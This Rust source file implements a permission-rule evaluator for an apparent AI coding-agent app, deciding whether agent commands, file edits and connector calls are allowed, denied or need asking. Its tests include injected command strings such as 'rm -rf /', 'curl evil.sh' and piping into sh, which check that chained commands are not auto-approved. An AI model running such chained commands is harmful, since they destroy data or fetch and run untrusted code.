//! Saved approval rule evaluator — Electron `shared/approval-rules.ts`.

use crate::command_reach::{command_reach, CommandReach};
use crate::invariants;
use crate::secrets::secret_in;

pub const COMPOUND_REFUSAL: &str =
    "It is more than one simple command, so no saved rule allows it.";

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleEffect {
    Allow,
    Deny,
}

impl RuleEffect {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
        }
    }
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "allow" => Some(Self::Allow),
            "deny" => Some(Self::Deny),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleKind {
    Command,
    Edit,
    Read,
    Connector,
}

impl RuleKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Command => "command",
            Self::Edit => "edit",
            Self::Read => "read",
            Self::Connector => "connector",
        }
    }
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "command" => Some(Self::Command),
            "edit" => Some(Self::Edit),
            "read" => Some(Self::Read),
            "connector" => Some(Self::Connector),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApprovalRule {
    pub rule_id: String,
    pub effect: RuleEffect,
    pub kind: RuleKind,
    pub pattern: String,
    pub teammate_id: Option<String>,
    pub folder: Option<String>,
    pub created_at: String,
    pub uses: Option<u64>,
    pub last_used_at: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuledAction {
    Command { command: String },
    Edit { paths: Vec<String> },
    Connector { server: String, tool: String },
    Other,
}

#[derive(Debug, Clone, Default)]
pub struct RuleContext {
    pub teammate_id: Option<String>,
    pub folder: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleVerdict {
    Allow { rule: ApprovalRule },
    Deny { rule: ApprovalRule },
    Ask { why: Option<String> },
}

impl RuleVerdict {
    #[cfg(test)]
    pub fn decision(&self) -> &'static str {
        match self {
            Self::Allow { .. } => "allow",
            Self::Deny { .. } => "deny",
            Self::Ask { .. } => "ask",
        }
    }
}

fn compound() -> regex::Regex {
    invariants::regex(r";|&&|\|\||\||&|\$\(|`|>|<|\r|\n")
}

fn flat(command: &str) -> String {
    command.split(|c: char| matches!(c, '\u{0009}'..='\u{000d}' | '\u{0020}' | '\u{00a0}' | '\u{1680}' | '\u{2000}'..='\u{200a}' | '\u{2028}' | '\u{2029}' | '\u{202f}' | '\u{205f}' | '\u{3000}' | '\u{feff}'))
        .filter(|part| !part.is_empty()).collect::<Vec<_>>().join(" ")
}

fn simple_parts(command: &str) -> Vec<String> {
    invariants::regex(r";|&&|\|\||\||&|\r|\n|\$\(|`|\)")
        .split(command)
        .map(|part| flat(&invariants::regex(r"[<>].*$").replace(part, "")))
        .filter(|part| !part.is_empty())
        .collect()
}

fn command_matches(pattern: &str, command: &str) -> bool {
    let want = flat(pattern);
    let have = flat(command);
    if want.is_empty() || have.is_empty() {
        return false;
    }
    if let Some(prefix) = want.strip_suffix(":*") {
        let prefix = prefix.trim_end();
        return !prefix.is_empty() && (have == prefix || have.starts_with(&format!("{prefix} ")));
    }
    have == want
}

fn slashes(path: &str) -> String {
    let s = path.replace('\\', "/");
    s.trim_end_matches('/').to_owned()
}

pub fn inside_folder(path: &str, folder: &str) -> Option<String> {
    let base = slashes(folder);
    let raw = slashes(path);
    let absolute = invariants::regex(r"^[A-Za-z]:/").is_match(&raw) || raw.starts_with('/');
    let joined = if absolute {
        raw
    } else {
        format!("{base}/{raw}")
    };
    let mut parts: Vec<String> = Vec::new();
    for part in joined.split('/') {
        if part.is_empty() && !parts.is_empty() {
            continue;
        }
        if part == "." {
            continue;
        }
        if part == ".." {
            if parts.len() <= 1 {
                return None;
            }
            parts.pop();
            continue;
        }
        parts.push(part.to_owned());
    }
    let resolved = parts.join("/");
    let windows = invariants::regex(r"^[A-Za-z]:").is_match(&base);
    let same = |left: &str, right: &str| {
        if windows {
            left.eq_ignore_ascii_case(right)
        } else {
            left == right
        }
    };
    if !resolved.get(..base.len()).is_some_and(|prefix| same(prefix, &base)) {
        return None;
    }
    let rest = &resolved[base.len()..];
    if rest.is_empty() {
        return Some(String::new());
    }
    if !rest.starts_with('/') {
        return None;
    }
    Some(rest[1..].to_owned())
}

fn glob_to_regex(pattern: &str, case_blind: bool) -> Result<regex::Regex, regex::Error> {
    let text = slashes(pattern).strip_prefix("./").unwrap_or(&slashes(pattern)).to_owned();
    let mut out = String::from("^");
    let chars: Vec<char> = text.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let character = chars[i];
        if character == '*' {
            if chars.get(i + 1) == Some(&'*') {
                if chars.get(i + 2) == Some(&'/') {
                    out.push_str("(?:.*/)?");
                    i += 3;
                    continue;
                }
                out.push_str(".*");
                i += 2;
                continue;
            }
            out.push_str("[^/]*");
            i += 1;
            continue;
        }
        if character == '?' {
            out.push_str("[^/]");
            i += 1;
            continue;
        }
        out.push_str(&regex::escape(&character.to_string()));
        i += 1;
    }
    out.push('$');
    if case_blind {
        regex::RegexBuilder::new(&out).case_insensitive(true).build()
    } else {
        regex::Regex::new(&out)
    }
}

fn path_matches(pattern: &str, relative: &str, case_blind: bool) -> bool {
    glob_to_regex(pattern, case_blind)
        .map(|re| re.is_match(relative))
        .unwrap_or(false)
}

fn scoped(rule: &ApprovalRule, context: &RuleContext) -> bool {
    if let Some(id) = &rule.teammate_id
        && context.teammate_id.as_deref() != Some(id.as_str()) {
            return false;
        }
    if let Some(folder) = &rule.folder {
        let Some(ctx) = &context.folder else {
            return false;
        };
        if inside_folder(ctx, folder).as_deref() != Some("") {
            return false;
        }
    }
    true
}

fn matches(rule: &ApprovalRule, action: &RuledAction, context: &RuleContext) -> bool {
    match action {
        RuledAction::Command { command } if rule.kind == RuleKind::Command => {
            if rule.effect == RuleEffect::Deny {
                let mut parts = vec![flat(command)];
                parts.extend(simple_parts(command));
                parts.iter().any(|part| command_matches(&rule.pattern, part))
            } else {
                !compound().is_match(command) && command_matches(&rule.pattern, command)
            }
        }
        RuledAction::Edit { paths } if rule.kind == RuleKind::Edit => {
            path_rule_matches(rule, paths, context)
        }
        RuledAction::Connector { server, tool } if rule.kind == RuleKind::Connector => {
            let mut parts = rule.pattern.splitn(2, '/');
            let rule_server = parts.next().unwrap_or("");
            let rule_tool = parts.next();
            rule_server == server && (rule_tool.is_none() || rule_tool == Some(tool.as_str()))
        }
        _ => false,
    }
}

fn path_rule_matches(rule: &ApprovalRule, paths: &[String], context: &RuleContext) -> bool {
    let folder = rule.folder.as_deref().or(context.folder.as_deref());
    let Some(folder) = folder else {
        return false;
    };
    if paths.is_empty() {
        return false;
    }
    let relative: Vec<_> = paths.iter().map(|p| inside_folder(p, folder)).collect();
    if rule.effect == RuleEffect::Deny {
        relative.iter().any(|p| {
            p.as_ref()
                .is_some_and(|path| path_matches(&rule.pattern, path, true))
        }) || paths
            .iter()
            .any(|p| path_matches(&rule.pattern, &slashes(p), true))
    } else {
        let case_blind = invariants::regex(r"^[A-Za-z]:").is_match(folder);
        relative.iter().all(|p| {
            p.as_ref().is_some_and(|path| {
                !path.is_empty() && path_matches(&rule.pattern, path, case_blind)
            })
        })
    }
}

pub fn decide_by_rules(
    action: &RuledAction,
    rules: &[ApprovalRule],
    context: &RuleContext,
) -> RuleVerdict {
    if matches!(action, RuledAction::Other) {
        return RuleVerdict::Ask { why: None };
    }
    let applicable: Vec<_> = rules.iter().filter(|r| scoped(r, context)).cloned().collect();
    if let Some(denied) = applicable
        .iter()
        .find(|r| r.effect == RuleEffect::Deny && matches(r, action, context))
    {
        return RuleVerdict::Deny {
            rule: denied.clone(),
        };
    }
    if let Some(allowed) = applicable
        .iter()
        .find(|r| r.effect == RuleEffect::Allow && matches(r, action, context))
    {
        return RuleVerdict::Allow {
            rule: allowed.clone(),
        };
    }
    if let RuledAction::Command { command } = action
        && compound().is_match(command)
            && applicable.iter().any(|r| {
                r.effect == RuleEffect::Allow
                    && r.kind == RuleKind::Command
                    && command_matches(
                        &r.pattern,
                        simple_parts(command).first().map(String::as_str).unwrap_or(""),
                    )
            })
        {
            return RuleVerdict::Ask {
                why: Some(COMPOUND_REFUSAL.into()),
            };
        }
    RuleVerdict::Ask { why: None }
}

pub fn rule_sentence(rule: &ApprovalRule, teammate_name: Option<&str>) -> String {
    let who = if rule.teammate_id.is_none() {
        "Any teammate".to_owned()
    } else {
        teammate_name.unwrap_or("This teammate").to_owned()
    };
    let verb = if rule.effect == RuleEffect::Allow {
        "may"
    } else {
        "may not"
    };
    let what = match rule.kind {
        RuleKind::Command => {
            if let Some(prefix) = rule.pattern.strip_suffix(":*") {
                format!("run commands starting \"{}\"", prefix.trim())
            } else {
                format!("run \"{}\"", rule.pattern)
            }
        }
        RuleKind::Edit => format!("change files matching {}", rule.pattern),
        RuleKind::Read => format!("read files matching {}", rule.pattern),
        RuleKind::Connector => {
            if rule.pattern.contains('/') {
                let mut parts = rule.pattern.splitn(2, '/');
                let server = parts.next().unwrap_or("");
                let tool = parts.next().unwrap_or("");
                format!("use {tool} on {server}")
            } else {
                format!("use the {} connector", rule.pattern)
            }
        }
    };
    let where_ = rule
        .folder
        .as_ref()
        .map(|f| format!(" in {}", slashes(f).rsplit('/').next().unwrap_or(f)))
        .unwrap_or_default();
    let ask = if rule.effect == RuleEffect::Allow {
        " without asking"
    } else {
        ""
    };
    format!("{who} {verb} {what}{where_}{ask}.")
}

pub fn unwrapped_command(command: &str) -> String {
    let text = command.trim();
    if let Some(caps) = invariants::regex(
        r#"(?i)^(?:"[^"]*(?:powershell|pwsh)(?:\.exe)?"|\S*(?:powershell|pwsh)(?:\.exe)?)\s+(?:-(?:NoProfile|NoLogo|NonInteractive)\s+)*-Command\s+'((?:[^']|'')*)'$"#,
    )
    .captures(text)
    {
        return caps[1].replace("''", "'");
    }
    if let Some(caps) =
        invariants::regex(r"^(?:/(?:usr/)?bin/)?(?:bash|sh|zsh)\s+-l?c\s+'([^']*)'$").captures(text)
    {
        return caps[1].to_owned();
    }
    text.to_owned()
}

pub fn diff_paths(diff: &str) -> Vec<String> {
    let mut paths = Vec::new();
    for line in diff.split('\n') {
        let line = line.trim_end_matches('\r');
        if let Some(caps) = invariants::regex(r"^(?:\+\+\+|---) (?:[ab]/)?(.+?)\s*$").captures(line)
        {
            let path = caps[1].to_owned();
            if path != "/dev/null" && !paths.contains(&path) {
                paths.push(path);
            }
        }
    }
    paths
}

pub struct RequestView<'a> {
    pub kind: &'a str,
    pub summary: &'a str,
    pub detail: &'a str,
    pub runtime: Option<&'a str>,
    pub patch_text: Option<&'a str>,
}

pub fn ruled_action_of(request: RequestView<'_>) -> RuledAction {
    match request.kind {
        "command" => {
            if request.summary == "Run a command" && !request.detail.trim().is_empty() {
                RuledAction::Command {
                    command: unwrapped_command(request.detail),
                }
            } else {
                RuledAction::Other
            }
        }
        "file-change" => {
            let from_diff = request
                .patch_text
                .map(diff_paths)
                .unwrap_or_default();
            if !from_diff.is_empty() {
                return RuledAction::Edit { paths: from_diff };
            }
            let detail = request.detail.trim();
            if detail.is_empty() {
                return RuledAction::Other;
            }
            if request.runtime == Some("claude") && request.summary.starts_with("Change 1 file") {
                return RuledAction::Edit {
                    paths: vec![detail.to_owned()],
                };
            }
            if request.runtime == Some("copilot") {
                return RuledAction::Edit {
                    paths: detail
                        .split(", ")
                        .filter(|p| !p.is_empty())
                        .map(str::to_owned)
                        .collect(),
                };
            }
            RuledAction::Other
        }
        "connector" => {
            if let Some(caps) = invariants::regex(r"^Use (\S+) on (.+)$").captures(request.summary) {
                RuledAction::Connector {
                    tool: caps[1].to_owned(),
                    server: caps[2].to_owned(),
                }
            } else {
                RuledAction::Other
            }
        }
        _ => RuledAction::Other,
    }
}

pub fn rule_candidate_of(
    action: &RuledAction,
    context: &RuleContext,
) -> Option<ApprovalRuleDraft> {
    let teammate_id = context.teammate_id.clone();
    let folder = context.folder.clone();
    match action {
        RuledAction::Command { command } => {
            if compound().is_match(command) {
                return None;
            }
            let pattern = flat(command);
            if pattern.is_empty() || pattern.encode_utf16().count() > 400 {
                return None;
            }
            if secret_in(&pattern).is_some() {
                return None;
            }
            Some(ApprovalRuleDraft {
                effect: RuleEffect::Allow,
                kind: RuleKind::Command,
                pattern,
                teammate_id,
                folder,
            })
        }
        RuledAction::Edit { paths } => {
            let folder_path = context.folder.as_ref()?;
            if paths.len() != 1 {
                return None;
            }
            let relative = inside_folder(&paths[0], folder_path)?;
            if relative.is_empty() || relative.contains(['*', '?']) {
                return None;
            }
            Some(ApprovalRuleDraft {
                effect: RuleEffect::Allow,
                kind: RuleKind::Edit,
                pattern: relative,
                teammate_id,
                folder,
            })
        }
        RuledAction::Connector { server, tool } => Some(ApprovalRuleDraft {
            effect: RuleEffect::Allow,
            kind: RuleKind::Connector,
            pattern: format!("{server}/{tool}"),
            teammate_id,
            folder,
        }),
        RuledAction::Other => None,
    }
}

#[derive(Debug, Clone)]
pub struct ApprovalRuleDraft {
    pub effect: RuleEffect,
    pub kind: RuleKind,
    pub pattern: String,
    pub teammate_id: Option<String>,
    pub folder: Option<String>,
}

pub fn reach_of_request(request: RequestView<'_>) -> Option<CommandReach> {
    match ruled_action_of(request) {
        RuledAction::Command { command } => command_reach(Some(&command)),
        _ => None,
    }
}

pub fn enforced_answer_decision(request: RequestView<'_>, decision: &str) -> (String, Option<String>) {
    if decision != "approve-always" {
        return (decision.to_owned(), None);
    }
    match reach_of_request(request) {
        None => (decision.to_owned(), None),
        Some(reach) => (
            "approve-once".into(),
            Some(format!("asked each time: {}", reach.short)),
        ),
    }
}

pub fn rule_refusal_for(request: RequestView<'_>) -> Option<String> {
    let reach = reach_of_request(request)?;
    Some(format!(
        "Not saved as a rule: this command {}. {} Locust asks each time.",
        reach.short, reach.said
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn javascript_whitespace_and_secret_boundaries_do_not_broaden_rules() {
        let rules = [rule(RuleEffect::Allow, RuleKind::Command, "echo hi")];
        let action = RuledAction::Command { command: "echo\u{0085}hi".into() };
        assert_eq!(decide_by_rules(&action, &rules, &RuleContext::default()).decision(), "ask");
        let secret = format!("echo és{}", "k-proj-abcdefghijklmnopqrstuvwx");
        assert!(rule_candidate_of(&RuledAction::Command { command: secret }, &RuleContext::default()).is_none());
    }

    #[test]
    fn file_globs_strip_only_one_dot_slash_and_unicode_paths_do_not_panic() {
        let context = RuleContext { teammate_id: None, folder: Some("/project".into()) };
        let action = RuledAction::Edit { paths: vec!["src/main.rs".into()] };
        assert_eq!(decide_by_rules(&action, &[rule(RuleEffect::Allow, RuleKind::Edit, "././src/**")], &context).decision(), "ask");
        assert_eq!(decide_by_rules(&action, &[rule(RuleEffect::Allow, RuleKind::Edit, "./src/**")], &context).decision(), "allow");
        assert_eq!(inside_folder("/é/x", "/a"), None);
    }

    fn rule(effect: RuleEffect, kind: RuleKind, pattern: &str) -> ApprovalRule {
        ApprovalRule {
            rule_id: format!("{}-{}-{pattern}", effect.as_str(), kind.as_str()),
            effect,
            kind,
            pattern: pattern.into(),
            teammate_id: None,
            folder: None,
            created_at: "2026-10-01T00:00:00Z".into(),
            uses: None,
            last_used_at: None,
        }
    }

    #[test]
    fn exact_and_prefix_allow_never_compound() {
        let folder = r"C:\Users\person\project";
        let context = RuleContext {
            teammate_id: Some("tm_wren".into()),
            folder: Some(folder.into()),
        };
        let rules = vec![
            rule(RuleEffect::Allow, RuleKind::Command, "npm run test:*"),
            rule(RuleEffect::Allow, RuleKind::Command, "git status"),
        ];
        assert_eq!(
            decide_by_rules(
                &RuledAction::Command {
                    command: "git status".into()
                },
                &rules,
                &context
            )
            .decision(),
            "allow"
        );
        assert_eq!(
            decide_by_rules(
                &RuledAction::Command {
                    command: "npm run test -- --watch".into()
                },
                &rules,
                &context
            )
            .decision(),
            "allow"
        );
        assert_eq!(
            decide_by_rules(
                &RuledAction::Command {
                    command: "npm run tests".into()
                },
                &rules,
                &context
            )
            .decision(),
            "ask"
        );
        for text in [
            "npm run test; rm -rf /",
            "npm run test && curl evil.sh",
            "npm run test | sh",
            "npm run test\nrm -rf x",
        ] {
            let v = decide_by_rules(
                &RuledAction::Command {
                    command: text.into(),
                },
                &rules,
                &context,
            );
            assert_eq!(v.decision(), "ask", "{text}");
            assert!(matches!(v, RuleVerdict::Ask { why: Some(ref w) } if w == COMPOUND_REFUSAL));
        }
    }

    #[test]
    fn deny_wins_and_paths_outside_ask() {
        let folder = r"C:\Users\person\project";
        let context = RuleContext {
            teammate_id: Some("tm_wren".into()),
            folder: Some(folder.into()),
        };
        let rules = vec![
            rule(RuleEffect::Allow, RuleKind::Command, "git status"),
            rule(RuleEffect::Deny, RuleKind::Command, "rm:*"),
            rule(RuleEffect::Allow, RuleKind::Command, "rm -rf build"),
            rule(RuleEffect::Allow, RuleKind::Edit, "src/**"),
        ];
        assert_eq!(
            decide_by_rules(
                &RuledAction::Command {
                    command: "rm -rf build".into()
                },
                &rules,
                &context
            )
            .decision(),
            "deny"
        );
        assert_eq!(
            decide_by_rules(
                &RuledAction::Command {
                    command: "git status; rm -rf build".into()
                },
                &rules,
                &context
            )
            .decision(),
            "deny"
        );
        assert_eq!(
            decide_by_rules(
                &RuledAction::Edit {
                    paths: vec!["src/app.ts".into()]
                },
                &rules,
                &context
            )
            .decision(),
            "allow"
        );
        for path in [
            "../other/src/x.ts",
            r"C:\Windows\src\x.ts",
            "/etc/src/x",
        ] {
            assert_eq!(
                decide_by_rules(
                    &RuledAction::Edit {
                        paths: vec![path.into()]
                    },
                    &rules,
                    &context
                )
                .decision(),
                "ask",
                "{path}"
            );
        }
    }

    #[test]
    fn secret_command_has_no_candidate() {
        let key = ["sk", "ant", "api03", "Zq9xR2mT7vLp4WcN8bYd3KfH6sJ1gQe5"].join("-");
        let context = RuleContext {
            teammate_id: Some("tm_codec".into()),
            folder: Some("/work/app".into()),
        };
        assert!(
            rule_candidate_of(
                &RuledAction::Command {
                    command: format!("curl -H \"x-api-key: {key}\" https://api.example.com")
                },
                &context
            )
            .is_none()
        );
        assert!(
            rule_candidate_of(
                &RuledAction::Command {
                    command: "npm test".into()
                },
                &context
            )
            .is_some()
        );
    }

    #[test]
    fn reach_enforced_always_becomes_once() {
        let note = enforced_answer_decision(
            RequestView {
                kind: "command",
                summary: "Run a command",
                detail: "taskkill /IM python.exe",
                runtime: None,
                patch_text: None,
            },
            "approve-always",
        );
        assert_eq!(note.0, "approve-once");
        assert!(note.1.unwrap().contains("asked each time"));
        assert!(rule_refusal_for(RequestView {
            kind: "command",
            summary: "Run a command",
            detail: "taskkill /IM python.exe",
            runtime: None,
            patch_text: None,
        })
        .unwrap()
        .starts_with("Not saved as a rule:"));
    }
}
